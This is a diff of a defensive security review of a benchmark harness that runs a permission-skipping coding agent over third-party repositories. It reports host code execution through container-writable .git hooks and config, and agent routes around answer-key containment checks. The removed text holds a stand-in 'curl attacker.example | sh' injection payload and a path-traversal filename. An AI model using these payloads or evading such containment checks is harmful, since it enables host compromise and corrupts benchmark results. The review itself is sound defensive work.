@@ -1,550 +1,429 @@
-# Security Review — `feat/crb-direction1-harness` (fix pass 2)
+# Security Review — CRB direction-1 harness, containment reset/void rework
 
-Commit: ed68ced
-
-**Scope:** `git diff 529ecd2..ed68ced` — the review-fix commit only. `529ecd2` and earlier are
-context, not under review.
+**Scope:** `git diff 59733d8..HEAD -- . ':!docs/reviews'` on `feat/crb-direction1-harness` (commits `cf6e7c9`, `5bd0b09`, `46a5f17`)
+**Commit:** 46a5f17
 **Date:** 2026-08-18
-**Based on:** the pass-1 security review (`Commit: 529ecd2`, same path, now overwritten) and
-`docs/reviews/code-review-rubric-2026-08-18-feat-crb-direction1-harness.md`. Sibling commits
-`ae3362b` (rubric) and `92749ff` (pre-mortem) are docs-only.
-**Calibration:** research tooling, one expert operator, own workstation, public benchmark repos.
-Nothing here is internet-exposed. The "attacker" in every scenario is *content inside a
-third-party repository the harness deliberately clones and hands to an agent running with
-`--dangerously-skip-permissions`*. Blast radius is one workstation, one API key, and the
-integrity of the benchmark numbers. Severities are set against that, not against a production
-service.
+**Based on:** iteration-2 code-fact-check (5 Incorrect findings, all doc/comment mechanism errors, closed in 46a5f17); prior review item R3 (container egress) treated as known and out of verdict scope
+**Position:** iteration 2 of a 3-iteration review-fix loop, ahead of a $50–2000 sweep over 50 third-party repositories
 
-> ⚠️ **No fresh code fact-check report was provided for this commit.** `docs/reviews/code-fact-check-report*.md`
-> were rewritten in the same range and describe the pre-fix code, so I re-read every
-> security-relevant path in `ed68ced` directly rather than relying on them.
+> ⚠️ **No code fact-check report was attached to this invocation.** The orchestrator supplied a
+> *summary* of the iteration-2 fact-check's Incorrect findings, which I have taken as given and
+> not re-verified. Claims in comments outside those five items are not independently verified;
+> where a comment's security claim is load-bearing below, I read or executed the mechanism myself
+> and say so.
 
 ---
 
-## Verdict on the prior findings — the primary output of this pass
+> 🚨 **HALT — ESCALATE TO HUMAN**
+>
+> **Pattern:** Command execution from untrusted content (escalation pattern 3, extended from
+> "injection in user-facing code" to "attacker-influenced repository content executed host-side")
+> **Location:** `scripts/crb-materialize.py:348` (`git checkout --force`), `runs/review-arms/crb-pipeline/run-host.sh:344` (`git status`)
+> **Detail:** The review container is given a read-write bind mount of the *entire clone including
+> `.git`*, runs with `--dangerously-skip-permissions`, and then the host runs `git status`,
+> `git checkout --force`, `git reset --hard`, `git clean -qfdx` against that same directory.
+> I demonstrated four independent host-side code-execution paths from container-writable
+> `.git` content: `.git/hooks/post-checkout`, `.git/hooks/reference-transaction`,
+> `core.fsmonitor`, and `core.hooksPath` — all fired as the invoking host user (uid 1000) in a
+> local reproduction. A fifth, `core.worktree`, made `git clean -qfdx` delete files in an
+> arbitrary host directory.
+>
+> This finding requires immediate human attention before the remaining review is actionable.
+> Do not run the sweep until this is resolved.
 
-| Prior | Claim in `ed68ced` | Verdict | Why |
-|---|---|---|---|
-| **R3** (High) prompt injection → live key | "partially addressed … scoped key + egress allowlist left to the author" | **Partially closed — deferral is honest, but only in the commit message** | The two sub-fixes are real and load-bearing (see below). The primary exposure is untouched and correctly described as untouched. See Finding 6. |
-| **A4** foreign-repo transcripts in tracked `runs/` | gitignored | **Closed for new runs** | Patterns verified against what `run-host.sh` actually writes. Residual tracked channels are narrower and acknowledged. See Finding 7. |
-| **A5** runbook key fails open to `api.withmartian.com` | generated `judge.sh` with endpoint guard | **Partially closed — and it introduced a new injection surface** | The default-value fix is correct and closes the actual A5 scenario. The `case` guard is bypassable and the override message is actively misleading. See Findings 2 and 3. |
-| **A6** `slug_for()` path escape | charset-constrained | **Half closed** | The slug regex is correct and blocks `/`, `.`, `..`, and absolute paths. The *other half* of the pass-1 recommendation — validating `fork` before it builds the clone URL — was not done. See Finding 5. |
-| **A7** harvest `cp` dereferences symlinks | `cp --no-dereference` | **Not closed — and regressed** | `--no-dereference` fixes only the final path component. The `-z \| tr \| cut` rewrite shipped in the *same hunk* introduced a stronger host-side path escape than the one A7 described. See Finding 1. |
-| **R2** (Structural) answer-key containment | callable `verify_containment()`, pre/post every cell, fails on surviving remotes | **Closed as a validity control; partially closed as a security control** | Structurally the right fix, and the remote check closes the most likely accidental route. It remains git-local, the post-run half is advisory-only, and `git fetch <url>` bypasses it. See Finding 4. |
-
-Nothing from pass 1 was *removed*. Findings 2, 4, 6, 8, 9 of the pass-1 report (npm volume,
-judge-prompt injection, temp-dir leak, egress) are unchanged and not re-litigated here except
-where this commit's fixes touch them.
+> 🚨 **HALT — ESCALATE TO HUMAN**
+>
+> **Pattern:** Destructive host-side file operation driven by untrusted config (same root cause,
+> distinct impact — a fix that only removes hooks does not close it)
+> **Location:** `scripts/crb-materialize.py:357` (`git clean -qfdx`)
+> **Detail:** With `core.worktree` set in the container-writable `.git/config`, `reset_clone()`'s
+> `git checkout --force` / `reset --hard` / `clean -qfdx` operate on the redirected directory.
+> In my reproduction this deleted every untracked file under an unrelated host path and wrote the
+> clone's tracked files there instead.
 
 ---
 
 ## Trust Boundary Map
 
 ```
-B1  : [vendored benchmark_data.json → repo_name / fork]
-                                  → [slug_for() regex (NEW, closes slug) ; fork STILL unvalidated]
-                                  → [DST_ROOT/<slug> + git clone URL]
-
-B2  : [third-party PR repo contents at /repo]
-                                  → [headless Claude Code, --dangerously-skip-permissions,
-                                     live ANTHROPIC_API_KEY, default bridge network — UNCHANGED]
-                                  → [container env + rw /repo + shared npm volume]
-
-B3' (moved): [filenames the agent leaves in the rw clone]
-                                  → [git status -z | tr '\0' '\n' | cut -c4- | grep  (NEW)]
-                                  → [host `mkdir -p` + `cp` under $dest/artifacts — ESCAPABLE]
-
-B5' (moved): [host ANTHROPIC_API_KEY]
-                                  → [generated judge.sh: :=default + case-glob endpoint guard (NEW)]
-                                  → [judge endpoint — default now api.anthropic.com, guard leaky]
-
-B6' (moved): [the merged upstream fix — the answer key]
-                                  → [verify_containment(): refs + remotes + range, pre & post cell (NEW)]
-                                  → [agent under test; network egress still NOT scrubbed]
-
-B7  (new)  : [operator CLI args: --tool-name / --judge / --out]
-                                  → [f-string interpolation, no quoting or escaping]
-                                  → [chmod 0755 judge.sh written into a git-tracked work dir]
+B1 (moved):   [third-party repo + reviewing agent, in container]
+                → [RW bind mount of $clone INCLUDING .git]
+                → [host-side git subprocesses in reset_clone()/harvest]  → [host user account]
+B2 (new):     [container-written .git/config, .git/hooks/, .gitattributes]
+                → [NO validation — nothing inspects .git before running git]
+                → [git's own config/hook/filter resolution on the host]
+B3:           [agent network egress + git object store]
+                → [fetch_traces() + classify_strays() reset-vs-void verdict]
+                → [benchmark score / published recall number]
+B4:           [agent-created files in the clone worktree]
+                → [porcelain -z parse + `/*|*..*` guard + `cp --no-dereference`]
+                → [tracked artifacts dir under runs/]
+B5:           [operator argv slug → run-host.sh $@ → --reset SLUG]
+                → [`DST_ROOT / slug` + manifest-entry gate]
+                → [host filesystem path / shutil-free read-write git ops]
+B6:           [run-meta.json + evaluations.json]
+                → [attrition() in crb-subset-leaderboard.py]
+                → [numbers pasted into a results doc]
 ```
 
-The commit's real effect is that **B6' hardened**, **B5' improved**, and **B3' got worse** — the
-harvest rewrite that was meant to close A7 opened a wider hole on the same boundary. B2, the
-dominant boundary, is unchanged by design and the commit says so. B7 is entirely new surface.
-
-No escalation block is emitted. Finding 1 is the closest call: it is a host-side arbitrary-write
-primitive, but reaching it requires B2 to have already been exercised (an injected agent creating
-a hostile filename), and no plaintext secret, disabled TLS, hardcoded key, or unauthenticated
-privileged endpoint appears anywhere in the diff.
+The diff's central move is on **B3**: what used to be a binary "any stray commit voids" is now a
+two-way split (reset benign agent work, void on contamination evidence). That is a genuine
+improvement in availability and it is well tested. But the diff also *increases traffic across
+B1/B2* — `--verify` was read-only (`rev-list`, `remote`, `diff`), while `--reset` adds
+`checkout --force`, `reset --hard`, `branch -f`, `update-ref -d`, `clean -qfdx`, `gc`,
+`symbolic-ref -d`. Every one of those is a git command that honours hooks, `core.fsmonitor`,
+`core.worktree`, and clean/smudge filters — all of which live inside the directory the container
+just had unrestricted write access to. B2 is the boundary the diff created and did not defend.
 
 ---
 
 ## Findings
 
-#### 1. The harvest rewrite lets an agent-chosen filename escape `$dest/artifacts` and write anywhere on the host
+#### Host-side arbitrary code execution from container-writable `.git/hooks` and `.git/config`
+
+**Severity:** Critical
+**Location:** `scripts/crb-materialize.py:348-361`, `runs/review-arms/crb-pipeline/run-host.sh:344`, mount at `run-host.sh:276`
+**Boundary:** B1, B2
+**Move:** #1 (trace the trust boundaries), #2 (implicit sanitization assumption)
+**Confidence:** High (executed)
+
+The container mounts the whole clone read-write:
+
+```
+    -v "$clone":/repo \
+```
+
+and runs `--dangerously-skip-permissions` over third-party repository content whose repo-local
+instructions load as they would for any real user (`run-host.sh:36`). Nothing restricts writes to
+the worktree — `/repo/.git` is equally writable. The host then runs, against that same directory:
+
+```
+    sh(["git", "checkout", "--force", "--quiet", "-B", "review", head], cwd=dst)
+    sh(["git", "reset", "--hard", "--quiet", head], cwd=dst)
+    sh(["git", "branch", "--quiet", "-f", "main", base], cwd=dst)
+```
+
+and earlier, in the harvest loop:
+
+```
+  done < <(git -C "$clone" status --porcelain=v1 -z --untracked-files=all)
+```
+
+I reproduced four execution paths locally, each firing as the invoking host user:
+
+| Mechanism | Trigger in this code | Observed |
+|---|---|---|
+| `.git/hooks/post-checkout` | `git checkout --force -B review` | `PWNED-post-checkout 1000` |
+| `.git/hooks/reference-transaction` | `checkout -B`, `reset --hard`, `branch -f`, `update-ref -d` | fired 8× across the reset sequence |
+| `core.fsmonitor = <path>` in `.git/config` | `git status --porcelain` (harvest, and `reset_clone`'s `dirty` probe) | `PWNED-fsmonitor` |
+| `core.hooksPath = <dir>` in `.git/config` | any hook-bearing command | `PWNED-hookspath` |
+| `filter.X.smudge` + `.gitattributes` | `git checkout --force` repopulating the worktree | `PWNED-smudge` |
+
+The `.gitattributes`/smudge variant is the nastiest, because `.gitattributes` is *tracked content*
+— a hostile benchmark fork could carry it without the agent doing anything, and it only needs the
+paired `filter.X.smudge` in `.git/config`, which the agent can write.
+
+Reachability is immediate: the harvest `git status` runs the moment the container exits, and the
+next cell's pre-run `--reset` (`run-host.sh:262`) runs the full sequence. The host shell has
+`ANTHROPIC_API_KEY` exported (`run-host.sh:109`) and write access to the repository, `~/.claude`,
+and Docker. This is not "attacker already controls the host" — the attacker controls a *benchmark
+repository*, which is exactly the input the harness is designed to ingest 50 of.
+
+**Recommendation:** Do three things, in order of how much they buy. (1) Stop giving the container
+`.git`: mount the worktree at `/repo` and keep the git directory outside the container (e.g.
+`git --separate-git-dir`, or a bind mount of a `.git` copy that is discarded and rebuilt per cell),
+so B2 stops existing. (2) Until then, run *every* host-side git command against these clones with
+hardening flags — `git -c core.fsmonitor= -c core.hooksPath=/dev/null -c core.worktree= -c
+protocol.file.allow=never -c core.symlinks=false …` — and add `GIT_CONFIG_NOSYSTEM=1`. Note that
+`-c` overrides do beat repo config, but this is a denylist and needs re-auditing per git version.
+(3) Add a pre-git sanitisation step in `reset_clone()` that runs *before* the first git invocation:
+delete `.git/hooks/*`, and reset `.git/config` from a pristine copy stashed at materialize time.
+Treat any modification to `.git/config`/`.git/hooks` as a *void* condition, not something to
+quietly repair — it is far better evidence of contamination than FETCH_HEAD is.
+
+---
+
+#### `core.worktree` in the mounted `.git/config` redirects `git clean -qfdx` at arbitrary host paths
+
+**Severity:** Critical
+**Location:** `scripts/crb-materialize.py:348-357`
+**Boundary:** B1, B2
+**Move:** #3 (error path / state after the operation), #11 (bypass enumeration)
+**Confidence:** High (executed)
+
+Distinct from the finding above because removing hooks does not close it. `reset_clone()` ends with:
+
+```
+    sh(["git", "clean", "-qfdx"], cwd=dst)
+```
+
+`git` resolves the worktree from `core.worktree` in `.git/config`, which the container can write.
+In my reproduction I set `core.worktree` to an unrelated directory containing `docs/notes.md` and
+`other.txt`; after the three-command sequence that directory contained only the clone's `f.txt` —
+both host files were deleted by `clean -qfdx` and the tracked file was written in their place.
+
+The same config also redirects the harvest's `git status --untracked-files=all`, which then
+enumerates the host directory. That *specific* exfiltration is blocked, and the guard that blocks
+it is not the traversal check — it is `[ -f "$clone/$f" ]` on `run-host.sh:338`, which resolves
+paths relative to `$clone` rather than to git's worktree, so the enumerated host file simply
+doesn't exist at the copy source. That is load-bearing safety by accident; it should be made
+deliberate.
+
+**Recommendation:** As above — `-c core.worktree=` on every host-side invocation is the one-line
+mitigation; not handing the container `.git` at all is the real fix. Separately, add a comment at
+`run-host.sh:338` recording that the `[ -f "$clone/$f" ]` test is a security control (it is
+currently written as a benign existence check), so a future refactor to `[ -e ]` or to a
+`git -C "$clone" show`-based harvest doesn't silently remove it.
+
+---
+
+#### A nested clone of the answer key inside `/repo` is invisible to every containment check and survives `git clean -qfdx`
 
 **Severity:** High
-**Location:** `runs/review-arms/crb-pipeline/run-host.sh:222-231`
-**Boundary:** B3' (precondition: B2)
-**Move:** #2 (implicit sanitization assumption), #1 (trust boundaries)
-**Confidence:** High that the parse breaks and the escape is reachable; Medium that any current
-benchmark fork would trigger it — this needs an injected or adversarial agent (i.e. R3) to create
-the filename.
-**Legibility-target:** for-author
+**Location:** `scripts/crb-materialize.py:200-264` (`fetch_traces`), `267-286` (`classify_strays`), `357` (`clean -qfdx`)
+**Boundary:** B3
+**Move:** #11 (enumerate bypasses)
+**Confidence:** High (executed)
 
-**Evidence:**
+`git clean -fdx` with a *single* `-f` deliberately refuses to remove a directory containing its own
+`.git`; `-ff` is required. `-q` suppresses the "Skipping repository" warning, and the exit status
+is 0. I reproduced the full sequence: `git clone <answer-key-url> ./ak` inside the clone yields
 
-```bash
-  (cd "$clone" && git status --porcelain=v1 -z --untracked-files=all) \
-    | tr '\0' '\n' | cut -c4- | grep -E '\.(md|json)$' \
-    | while read -r f; do
-        [ -f "$clone/$f" ] || continue
-        mkdir -p "$dest/artifacts/$(dirname "$f")"
-        # --no-dereference: the agent could leave a symlink in the repo, and this
-        # cp runs on the HOST, so following it would copy host files into a
-        # tracked artifacts dir.
-        cp --no-dereference "$clone/$f" "$dest/artifacts/$f" 2>/dev/null || true
-      done
-```
+- `git status --porcelain` → one entry, `?? ak/` (the harvest's `*.md|*.json` filter and
+  `[ -f ]` test both skip it, so it is never even logged);
+- `.git/FETCH_HEAD` → absent (the fetch happened in `ak/.git`, not `dst/.git`);
+- `git fsck --unreachable --no-reflogs` → silent;
+- `git rev-list --all --not $HEAD` → empty;
+- `git clean -qfdx` → exit 0, `ak/fix.txt` still present afterwards.
 
-Two defects in the new pipeline, both introduced by this commit:
+So the answer key persists in the clone *across cells*, undetected, and the next cell's reviewing
+agent finds it sitting in its working directory. Every check in the diff inspects `dst/.git`; a
+nested repository is a second git directory the checks never look at.
 
-**(a) `tr '\0' '\n'` throws away the only reason `-z` was added.** `-z` exists precisely so that
-filenames containing newlines survive; converting NUL to newline immediately re-merges the two
-namespaces. A filename with an embedded newline splits into two lines, and the second line is a
-bare path fragment with **no 3-character status prefix** — so `cut -c4-` chops three characters
-off the *path itself*.
-
-**(b) rename entries have the same shape.** In `--porcelain=v1 -z`, a rename is emitted as
-`XY <new>\0<orig>\0` — the original path is its own NUL-terminated field with no status prefix.
-`cut -c4-` mangles it identically. The comment on line 221 claims this hunk fixed rename handling;
-it now *includes* the second field and *corrupts* it.
-
-Verified non-hypothetically (no git mutation — the byte stream was synthesised):
-
-```
-$ printf 'A  docs/a.md\0R  new.md\0old.md\0?? we\nird/../../../../etc/passwd.json\0' \
-    | tr '\0' '\n' | cut -c4- | grep -E '\.(md|json)$'
-docs/a.md
-new.md
-.md                                  <- 'old.md' had 3 chars eaten
-/../../../../etc/passwd.json         <- traversal fragment, survives the grep
-```
-
-The last line is the attack. `$f` = `/../../../../etc/passwd.json` then flows into
-`[ -f "$clone/$f" ]` (an out-of-clone **read** on the host), `mkdir -p "$dest/artifacts/$(dirname "$f")"`
-(creates the traversal directories), and `cp --no-dereference "$clone/$f" "$dest/artifacts/$f"`
-(an out-of-artifacts **write** on the host). Source and destination are rooted at different depths,
-so the two resolve to different real paths: the agent picks one file to read and an unrelated host
-path to overwrite. The `.md`/`.json` suffix requirement is not much of a constraint — the obvious
-target is `$HOME/.claude/settings.json`, which is how a host-side hook gets planted; the payload is
-selected by the agent from anywhere the clone can reach. `2>/dev/null || true` guarantees this is
-silent.
-
-`cp --no-dereference` does not help here, and it does not fully close A7 either: it protects only
-the **final** component. If the agent replaces a *directory* inside the clone with a symlink
-(`docs -> /etc`), then `[ -f "$clone/docs/x.md" ]` follows it and `cp` reads through it, because
-`--no-dereference` never inspects intermediate components.
-
-**Recommendation:** Drop `tr`/`cut` and read NUL-delimited in the shell —
-`while IFS= read -r -d '' entry; do f=${entry:3}; ...` — which also lets you skip the trailing
-rename field explicitly. Then reject any `f` that is not a normal, contained path *before* using it:
-`case $f in /*|*..*) continue;; esac` plus `[ -L "$clone/$f" ] && continue`, and confirm the
-resolved source stays under `$clone` (`realpath -e --relative-base="$clone"`). Better still,
-scope the harvest to the directories the pipeline is supposed to write (`git status -z -- docs/reviews`)
-rather than the whole tree — the untrusted-filename channel then largely disappears.
+**Recommendation:** Two cheap changes. (a) Use `git clean -qffdx` so nested repositories are
+actually removed. (b) More importantly, treat "a directory containing `.git` exists anywhere under
+the worktree" as a **void** condition rather than something to clean — like a modified
+`.git/config`, it is strong positive evidence, not noise. A `git status`-visible `?? <dir>/` entry
+whose contents include `.git` should raise from `reset_clone()`.
 
 ---
 
-#### 2. The `judge.sh` endpoint guard matches on a substring, so a lookalike host passes
+#### The reset/void split's only real discriminator is *git-fetch traces*, so any non-git retrieval fails open as "benign agent work"
+
+**Severity:** High
+**Location:** `scripts/crb-materialize.py:267-286`, `315-343`
+**Boundary:** B3
+**Move:** #5 (invert the access-control model), #11
+**Confidence:** High (traced through code; not exercised end-to-end)
+
+Asked directly: is the split defensible as a security control, and where does it fail open?
+
+It is defensible *as an availability fix*, and the docstring is admirably honest about its limits:
+
+```
+    `foreign` = does not descend from the reviewed head. Descent is NECESSARY
+    for a stray to be treated as benign agent work, and it is NOT SUFFICIENT —
+```
+
+But invert it. The guard's decision procedure is: *no remote* ∧ *no fetch traces* ∧ *descends from
+head* ⇒ benign, reset it, keep the cell. Enumerate what that does **not** cover:
+
+1. **Any non-git retrieval.** `curl`/`gh pr view`/the agent's own WebFetch of the upstream merged
+   PR, content written into the working tree and committed on top of `head`. Descends from head;
+   no FETCH_HEAD; no unreachable commits; no remote. → **classified benign, cell kept, score
+   inflated.** Given the container has unrestricted egress and `--dangerously-skip-permissions`,
+   this is the *most likely* incidental-contamination route, not the least — an LLM agent asked to
+   review a PR reaches for the PR page far more readily than for `git fetch <URL>`.
+2. **Never touching disk at all.** The agent reads the upstream fix and writes it into its review
+   prose. `review.md` is harvested at `run-host.sh:294-312`, *before* any containment check runs.
+   No git artifact exists to detect. The guard cannot fire, by construction.
+3. **Nested clone** — finding above.
+4. **Clone outside `/repo`** (e.g. `/tmp/ak`) — acknowledged in the `fetch_traces()` docstring, and
+   undetectable by construction since every check is `cwd=dst`.
+5. **`.git/objects/info/alternates`** pointing at an out-of-repo object store — the answer-key
+   objects become readable with no fetch, no FETCH_HEAD, and nothing unreachable. *Untested.*
+
+The honest framing is that this is a **contamination-evidence detector for one specific route**
+(in-place `git fetch`), not a containment control. That is worth having, and the code says so.
+What it is not is a reason to believe a passing cell is clean — and the risk is that
+`voided_cells: []` in `run-meta.json` reads, to whoever writes the results doc, as "containment
+held."
+
+**Recommendation:** Do not change the guard's logic — it is correctly conservative for what it
+can see. Change what the artifacts *claim*. Add a `containment_detection_scope` field to
+`run-meta.json` naming the routes covered (in-place fetch, re-added remote, foreign-ancestry
+commit) and the routes not covered (out-of-band retrieval, nested/external clone, in-context
+only), and have `crb-subset-leaderboard.py` print it beside the attrition warning — the same
+reasoning the diff already applies to attrition ("a caveat that only ever existed on a terminal is
+a caveat that will not survive to the place the number is quoted") applies here with more force.
+The real control remains R3.
+
+---
+
+#### `git commit --amend`, squash, or rebase by the reviewing agent voids a clean cell
 
 **Severity:** Medium
-**Location:** `scripts/crb-pipeline-to-benchmark.py:463-468` (generated into `<out>/judge.sh`)
-**Boundary:** B5'
-**Move:** #5 (invert the access-control model — enumerate what the allowlist does not cover)
-**Confidence:** High (verified by execution)
-**Legibility-target:** for-author
+**Location:** `scripts/crb-materialize.py:339-343`
+**Boundary:** B3
+**Move:** #3 (error path), #5
+**Confidence:** Medium (traced through code; not exercised)
 
-**Evidence:**
+`classify_strays()` calls a stray benign only when `merge-base --is-ancestor head <c>` succeeds.
+The payload's own `CLAUDE.md` — mounted into every container — pushes hard on committing, and its
+commit-trigger guidance makes small, frequent commits the norm. Any agent that then amends,
+squashes, rebases, or commits from a detached checkout of `base` produces a commit that does
+*not* descend from `head`, and the cell is voided as contamination.
 
-```bash
-case "$MARTIAN_BASE_URL" in
-  *api.anthropic.com*) ;;
-  *) echo "MARTIAN_BASE_URL is '$MARTIAN_BASE_URL', not an api.anthropic.com endpoint." >&2
-     echo "Refusing to send MARTIAN_API_KEY there. Set CRB_ALLOW_FOREIGN_ENDPOINT=1 to override." >&2
-     [ "${CRB_ALLOW_FOREIGN_ENDPOINT:-}" = "1" ] || exit 1 ;;
-esac
-```
+This fails *closed*, so it is not a containment hole. It is a **denominator hole**: the same
+selection bias `attrition()` was written to expose. Cells lost this way are indistinguishable in
+`run-meta.json` from cells lost to real contamination (both land in `voided_cells`), so the
+leaderboard's attrition line will report "voided by a post-run containment failure" for what is
+actually ordinary agent behaviour, and the reader has no way to tell how much of the loss is
+signal.
 
-`*api.anthropic.com*` is an unanchored glob. Confirmed in a shell:
-
-```
-$ case "https://api.anthropic.com.evil.example/v1/" in *api.anthropic.com*) echo BYPASS;; esac
-BYPASS
-$ case "https://evil.example/?h=api.anthropic.com" in *api.anthropic.com*) echo BYPASS;; esac
-BYPASS
-```
-
-Both a suffix-extended domain and a query-parameter reflection satisfy the guard, and the key is
-`export`ed to the judge client before the case statement runs. This is a control whose stated job
-is "fail closed rather than shipping the key to whatever host happens to be the default"; a
-substring match does not do that job.
-
-Second defect in the same block: when `CRB_ALLOW_FOREIGN_ENDPOINT=1` is set, the script prints
-**"Refusing to send MARTIAN_API_KEY there"** and then sends it. The log line asserts the opposite
-of what happens, which is worse than no message — a terminal scrollback or a CI log will read as
-if the guard held. As an escape hatch itself the variable is defensible (the operator may
-legitimately judge via another provider), but it should be gated on an explicit acknowledgement in
-the message, not silently contradicted.
-
-**Recommendation:** Anchor the match — `case "$MARTIAN_BASE_URL" in https://api.anthropic.com/*) ;;`
-— and reorder the override so the affirmative path prints
-`"CRB_ALLOW_FOREIGN_ENDPOINT=1 — sending MARTIAN_API_KEY to <host> anyway"` instead of a refusal it
-does not honour.
+**Recommendation:** Split the void reason. `reset_clone()` already knows which check raised —
+carry that reason into `CONTAINMENT_FAILED` (write the message into the file instead of
+`: > "$dest/CONTAINMENT_FAILED"`), surface it in `run-meta.json`'s `voided_cells`, and let
+`attrition()` distinguish `remote/fetch-trace` voids from `foreign-ancestry` voids. Consider also
+whether a foreign commit whose *tree* is reachable from a descendant of `head` should be reset
+rather than voided.
 
 ---
 
-#### 3. `judge.sh` is built by f-string interpolation of CLI values; `--judge` reaches a command substitution
+#### The pre-run `--reset` widens what the harness will silently repair before a cell
 
 **Severity:** Medium
-**Location:** `scripts/crb-pipeline-to-benchmark.py:448-481`
-**Boundary:** B7
-**Move:** #2 (implicit sanitization assumption), #7 (serialization boundary — code as output)
-**Confidence:** High that injection works; Low that it is adversarially reachable (every input is
-an operator-typed CLI flag), which is why this is Medium and not High.
-**Legibility-target:** for-author
+**Location:** `runs/review-arms/crb-pipeline/run-host.sh:262-264`
+**Boundary:** B3
+**Move:** #4 (time-of-check to time-of-use)
+**Confidence:** Medium
 
-**Evidence:**
-
-```python
-    judge_sh = f"""#!/usr/bin/env bash
-...
-: "${{MARTIAN_MODEL:={args.judge}}}"
-...
-for step in step2_extract_comments step2_5_dedup_candidates step3_judge_comments; do
-  echo "=== $step --tool {args.tool_name}"
-  python -m "code_review_benchmark.$step" --tool "{args.tool_name}"
-done
-
-python3 {WORKSPACE}/scripts/crb-subset-leaderboard.py \\
-  --evaluations "{out}/results/{sanitize_model(args.judge)}/evaluations.json" \\
-  --tool "{args.tool_name}"
-"""
-    judge_path = out / "judge.sh"
-    judge_path.write_text(judge_sh)
-    judge_path.chmod(0o755)
-```
-
-`args.tool_name`, `args.judge`, and `out` are interpolated raw into shell source. Inside
-`"{args.tool_name}"` a single `"` closes the quote and the rest is command text; `{out}` is
-interpolated bare into the `python3 ...` line. The `--judge` path is worse than quoting, because
-`${VAR:=default}` performs full expansion — including command substitution — on the default word.
-Verified:
+Before the diff, the pre-run gate was `--verify` — read-only, and *any* deviation from the
+materialized state skipped the cell. It is now `--reset`, which repairs deviations and proceeds:
 
 ```
-$ : "${MARTIAN_MODEL:=$(echo PWNED-via-judge-arg)}" ; echo "$MARTIAN_MODEL"
-PWNED-via-judge-arg
+  python3 "$ROOT/scripts/crb-materialize.py" --reset "$id" || {
 ```
 
-So `--judge '$(curl -s attacker.example/x | sh)'` executes at `judge.sh` run time, not at
-generation time — the payload sits dormant in a `chmod 0755` file until the operator runs it. That
-file lands in `runs/review-arms/crb/offline-work-50/`, which is a **tracked** tree (siblings under
-`runs/review-arms/crb/` are committed and the new `.gitignore` rules do not cover `*.sh`), so a bad
-invocation gets persisted and re-run later by whoever checks out the branch.
+That is the right call for the intended case (a previous cell's agent commits). But it also means
+that anything reaching the clone *between* cells — a stray host process, a partially-completed
+prior reset, an interrupted sweep — is now repaired-and-run rather than skipped-and-noticed. The
+post-run reset already restored the baseline; the pre-run reset therefore only ever fires on
+*unexpected* state, and firing on unexpected state is exactly when you want to stop, not fix.
 
-On the credential question, the generated file is clean: the key is only ever referenced by name
-(`: "${MARTIAN_API_KEY:=${ANTHROPIC_API_KEY:-}}"`, then `export`), never interpolated into the
-file, never placed on a command line (so it does not appear in `ps`), and never echoed by the
-guard's error messages. The one residual is that `bash -x judge.sh` would print the `:` line with
-the key expanded — worth a `set +x` comment but not a finding on its own.
-
-**Recommendation:** Stop hand-rolling the shell. Build the script with `shlex.quote()` on every
-interpolated value, and pass the model as an ordinary assignment (`MARTIAN_MODEL="${MARTIAN_MODEL:-}"`
-plus `: "${MARTIAN_MODEL:=}"` seeded from a quoted literal) so no CLI value ever lands inside a
-`${...:=}` default. A cheap belt-and-braces addition: validate `--tool-name` and `--judge` against
-`[A-Za-z0-9._-]+` at parse time, the same instinct that fixed A6.
+**Recommendation:** Keep `--reset` post-run, and have the pre-run call report when it actually
+had to change something. `reset_clone()` already returns that note (`"; ".join(notes)`); have
+run-host.sh treat a non-empty pre-run note as at minimum a loud warning recorded in the cell
+directory, since post-run reset means it should be empty on every cell after the first.
 
 ---
 
-#### 4. Containment is re-asserted, but the post-run half only warns, and `git fetch <url>` never touches a ref
-
-**Severity:** Medium (integrity, not confidentiality)
-**Location:** `scripts/crb-materialize.py:167-192` (the control),
-`runs/review-arms/crb-pipeline/run-host.sh:236-237` (the advisory call)
-**Boundary:** B6'
-**Move:** #5 (invert the access-control model), #3 (check the error path)
-**Confidence:** High that the post-run path is advisory; Medium on the `FETCH_HEAD` bypass — the
-mechanism is well-defined but I did not execute it (no network, and no git mutation permitted this
-session).
-**Legibility-target:** for-author
-
-**Evidence:** the new control does what R2 asked for —
-
-```python
-    remotes = sh(["git", "remote"], cwd=dst)
-    if remotes:
-        raise RuntimeError(f"{slug}: remote(s) present ({remotes.split()!r}) — "
-                           "answer-key containment is broken")
-```
-
-and pre-run it fails closed —
-
-```bash
-  python3 "$ROOT/scripts/crb-materialize.py" --verify "$id" || {
-    echo "$id: PRE-RUN containment check failed — skipping cell" >&2; continue; }
-```
-
-but post-run it does not:
-
-```bash
-  python3 "$ROOT/scripts/crb-materialize.py" --verify "$id" \
-    || echo "$id: POST-RUN containment check FAILED — treat this cell's result as void" >&2
-```
-
-Three gaps, in descending order of how likely they are to actually bite:
-
-1. **The post-run verdict is a stderr line and nothing else.** By the time it runs, `result.json`,
-   `review.md`, and `artifacts/` are already written; the sweep continues; the aggregate spend gate
-   still counts the cell; and `crb-pipeline-to-benchmark.py` will inject the contaminated review
-   into `benchmark_data.json` with no marker. "Treat this cell's result as void" is an instruction
-   to a human reading a 50-cell scrollback. Nothing downstream can see it.
-2. **`git fetch <url>` leaves no ref.** `rev-list --all` covers `refs/`; a bare
-   `git fetch https://github.com/grafana/grafana` writes objects and `FETCH_HEAD`, which is not
-   under `refs/` and not in `--all`. `git log FETCH_HEAD` then reads the merged upstream fix and
-   the check passes. Likewise `git remote add … && git fetch && git remote remove` passes cleanly.
-3. **It is a git control facing a non-git channel.** The agent has WebFetch/WebSearch and open
-   egress (R3, unchanged), and the reviewed tree self-identifies its upstream in `package.json`,
-   `go.mod`, CI config, and license headers. A *diligent* reviewer — not an adversarial one —
-   looking up how the issue was actually resolved upstream defeats containment without touching
-   git at all.
-
-Also worth noting: `git clean -qfdx` runs *before* the post-run verify, so any file evidence of
-contamination (a stashed diff, a downloaded patch) is destroyed before the check that would have
-wanted it.
-
-This is still a large improvement — pinning the check to the manifest's recorded `head` correctly
-catches a moved `review` ref, and the remote check closes the most plausible accidental route. The
-issue is that it is being *presented* (in the commit message and in `crb-direction1-setup.md`) as
-the thing that makes the arm's numbers trustworthy, and it cannot carry that weight alone.
-
-**Recommendation:** Make the post-run result durable and machine-readable — write
-`{"containment": "failed"}` into that cell's `run-meta.json`/`result.json` and have
-`crb-pipeline-to-benchmark.py` refuse to inject cells so marked. Add `FETCH_HEAD` and
-`.git/objects` growth to `verify_containment` (`git rev-parse --verify FETCH_HEAD` succeeding is a
